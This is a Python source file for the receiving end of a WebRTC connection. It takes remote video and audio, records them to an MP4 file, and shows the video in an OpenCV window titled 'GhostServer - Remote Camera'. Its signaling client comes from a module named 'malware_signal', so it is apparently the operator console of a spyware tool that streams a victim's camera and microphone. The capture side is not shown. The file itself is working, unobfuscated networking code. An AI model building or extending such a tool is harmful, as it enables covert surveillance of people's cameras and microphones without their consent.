import asyncio
import cv2
from aiortc import RTCPeerConnection, RTCConfiguration, RTCIceCandidate, RTCIceServer, RTCSessionDescription
from aiortc.contrib.media import MediaRecorder, MediaRelay
from malware_signal.signal import SignalClient

class Receiver:
    # Initialize the peer connection, recorder, and related state for media handling.
    def __init__(self, signal: SignalClient, record_file: str = "received.mp4"):
        self.signal = signal
        self.pc = RTCPeerConnection(configuration=RTCConfiguration(
            iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])]
        ))
        self.remote_target = None
        self.recorder = MediaRecorder(record_file)
        self.remote_candidates = []
        self.relay = MediaRelay()
        self.video_task = None

        # Route incoming signaling messages to this receiver's message handler.
        signal.add_handler(self.handle_message)

        # Track changes in the ICE connection state and print them for debugging.
        @self.pc.on("iceconnectionstatechange")
        async def on_ice():
            print("[RECEIVER] ICE:", self.pc.iceConnectionState)

        # Track changes in the overall WebRTC connection state.
        @self.pc.on("connectionstatechange")
        async def on_conn():
            print("[RECEIVER] CONNECTION:", self.pc.connectionState)

        # When an ICE candidate is created, forward it to the remote peer through signaling.
        @self.pc.on("icecandidate")
        async def on_icecandidate(candidate):
            await self._on_icecandidate(candidate)

        # When a remote media track arrives, decide whether to record or display it.
        @self.pc.on("track")
        async def on_track(track):
            print("RECEIVED REMOTE TRACK:", track.kind)
            print("TRACK RECEIVED:", track.kind)

            if track.kind == "video":
                # Duplicate the track so one copy can be shown locally and another recorded.
                display_track = self.relay.subscribe(track)
                record_track = self.relay.subscribe(track)

                self.recorder.addTrack(record_track)
                await self.recorder.start()

                # Start a background task to display the incoming video frames.
                self.video_task = asyncio.create_task(self.show_video(display_track))

            elif track.kind == "audio":
                # Record audio tracks as part of the media output.
                self.recorder.addTrack(track)
                await self.recorder.start()

    # Send an ICE candidate to the remote peer through the signaling channel.
    async def _on_icecandidate(self, candidate):
        if candidate is None or self.remote_target is None:
            return
        await self.signal.send({"type": "ice-candidate", "target": self.remote_target,
            "data": {
                "candidate": {
                    "candidate": candidate.candidate,
                    "sdpMid": candidate.sdpMid,
                    "sdpMLineIndex": candidate.sdpMLineIndex,
                }
            },
        })

    # Process signaling messages such as offers, answers, and ICE candidates.
    async def handle_message(self, message):
        message_type = message.get("type")

        if message_type == "offer":
            # Remember which peer sent the offer and set the remote session description.
            self.remote_target = message.get("sender")
            desc = RTCSessionDescription(
                sdp=message["data"]["sdp"],
                type=message["data"]["type"],
            )
            await self.pc.setRemoteDescription(desc)

            # Create and set the local answer so the connection can be established.
            answer = await self.pc.createAnswer()
            await self.pc.setLocalDescription(answer)
            await self.signal.send({"type": "answer", "target": self.remote_target,
                "data": {
                    "sdp": self.pc.localDescription.sdp,
                    "type": self.pc.localDescription.type,
                },
            })

            # Apply any ICE candidates that arrived before the remote description was ready.
            while self.remote_candidates:
                candidate = self.remote_candidates.pop(0)
                await self.pc.addIceCandidate(candidate)

        elif message_type == "ice-candidate":
            # Build an ICE candidate object from the signaling payload and add it to the peer connection.
            candidate_data = message["data"]["candidate"]
            candidate = RTCIceCandidate(
                candidate=candidate_data["candidate"],
                sdpMid=candidate_data.get("sdpMid"),
                sdpMLineIndex=candidate_data.get("sdpMLineIndex"),
            )
            if self.pc.remoteDescription is None:
                self.remote_candidates.append(candidate)
            else:
                await self.pc.addIceCandidate(candidate)

        elif message_type == "peer-list":
            # Print the list of currently available peers from the signaling bash.
            peers = message["data"].get("peers", [])
            print("Peer list:", peers)

        elif message_type == "leave":
            # Report when a peer leaves the signaling room.
            print("Peer left:", message.get("sender"))

    # Display incoming video frames in a local OpenCV window.
    async def show_video(self, track):

        cv2.namedWindow("GhostServer - Remote Camera", cv2.WINDOW_NORMAL)

        while True:
            print("WAITING FOR FRAME...")

            try:
                frame = await track.recv()
            except Exception as e:
                print(e)
                break

            print("FRAME RECEIVED:", frame.pts)

            image = frame.to_ndarray(format="bgr24")
            cv2.imshow("GhostServer - Remote Camera", image)

            if cv2.waitKey(1) == 27:
                break
        cv2.destroyAllWindows()

    # Tear down the receiver, stop recording, and close the peer connection.
    async def close(self):
        if self.video_task:
            self.video_task.cancel()

        cv2.destroyAllWindows()
        await self.recorder.stop()
        await self.pc.close()